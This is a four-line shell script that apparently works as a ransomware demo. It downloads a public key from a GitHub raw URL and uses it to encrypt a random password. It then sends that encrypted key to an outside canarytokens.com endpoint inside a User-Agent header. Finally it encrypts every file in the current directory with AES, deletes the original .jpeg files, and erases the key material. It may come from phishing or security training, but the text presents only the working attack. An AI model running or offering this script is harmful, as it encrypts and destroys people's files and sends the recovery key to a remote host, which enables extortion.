curl https://raw.githubusercontent.com/phishermansfriend/playground/main/key.txt | base64 --decode | cat > pubkey.pem
openssl rand -hex 32 | cat > randpwd && openssl pkeyutl -encrypt -inkey pubkey.pem -pubin -in randpwd -out randpwd.enc
curl --silent --output /dev/null/ -A "$(base64 -w 0 randpwd.enc)" http://canarytokens.com/feedback/articles/h3ippv782xnzy36hrsbaumzvn/contact.php
for f in * ; do [ -f $f ] && openssl enc -p -aes-256-cbc -salt -in $f -out $f.enc -pass file:./randpwd; done; rm *.jpeg; rm randpwd*; rm pubkey.pem*

